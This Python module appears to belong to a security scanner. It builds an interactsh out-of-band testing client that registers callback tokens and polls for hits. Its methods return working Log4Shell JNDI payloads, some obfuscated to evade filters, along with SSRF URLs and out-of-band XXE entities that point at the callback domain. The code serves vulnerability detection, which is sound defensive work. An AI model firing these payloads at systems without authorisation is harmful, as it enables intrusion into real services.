"""OAST (Out-of-Band Application Security Testing) client — interactsh integration."""
from __future__ import annotations
import asyncio
import random
import string
import time
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console

log = get_logger(__name__)


class OASTClient:
    """Client for interactsh OAST server."""

    def __init__(
        self,
        server: str = "oast.pro",
        custom_url: str | None = None,
    ):
        self.server = custom_url or server
        self._tokens: dict[str, dict[str, Any]] = {}

    def register(self) -> str:
        """Generate a unique OAST interaction token."""
        token = "".join(random.choices(string.ascii_lowercase + string.digits, k=16))
        full = f"{token}.{self.server}"
        self._tokens[token] = {
            "full": full,
            "registered_at": time.time(),
            "hits": [],
        }
        return full

    def get_payload_url(self, prefix: str = "") -> str:
        """Get a unique URL for OOB testing."""
        token = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
        if prefix:
            return f"http://{prefix}-{token}.{self.server}/"
        return f"http://{token}.{self.server}/"

    async def poll(self, token: str, timeout: int = 30) -> list[dict[str, Any]]:
        """Poll interactsh for callbacks matching token."""
        domain_part = token.split(".")[0] if "." in token else token
        hits: list[dict[str, Any]] = []
        deadline = time.monotonic() + timeout
        async with TalismanHTTPClient(timeout=15) as client:
            while time.monotonic() < deadline:
                try:
                    r = await client.get(
                        f"https://{self.server}/poll?id={domain_part}",
                        timeout=10,
                    )
                    if r.status_code == 200:
                        data = r.json()
                        if data.get("data"):
                            for hit in data["data"]:
                                hits.append({
                                    "type": hit.get("protocol", "unknown"),
                                    "source_ip": hit.get("remote-address", ""),
                                    "timestamp": hit.get("timestamp", ""),
                                    "raw": hit.get("raw-request", ""),
                                })
                            if hits:
                                return hits
                except Exception as e:
                    log.debug("oast_poll_error", error=str(e))
                await asyncio.sleep(5)
        return hits

    def get_log4shell_payloads(self, token: str) -> list[str]:
        """Get Log4Shell JNDI payloads pointing to OAST token."""
        domain = token if "." in token else f"{token}.{self.server}"
        return [
            f"${{jndi:ldap://{domain}/a}}",
            f"${{${{lower:j}}ndi:${{lower:l}}dap://{domain}/a}}",
            f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{domain}/a}}",
            f"${{j${{::-n}}di:ldap://{domain}/a}}",
            f"${{jndi:rmi://{domain}/a}}",
            f"${{jndi:dns://{domain}/a}}",
            f"${{${{upper:j}}ndi:ldap://{domain}/a}}",
        ]

    def get_ssrf_payloads(self, token: str) -> list[str]:
        """Get SSRF payloads pointing to OAST token."""
        domain = token if "." in token else f"{token}.{self.server}"
        return [
            f"http://{domain}/",
            f"https://{domain}/",
            f"http://{domain}@127.0.0.1/",
        ]

    def get_xxe_payloads(self, token: str) -> list[str]:
        """Get XXE OOB payloads."""
        domain = token if "." in token else f"{token}.{self.server}"
        return [
            f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM "http://{domain}/xxe"> %xxe;]><r/>',
            f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><r>&xxe;</r>',
        ]
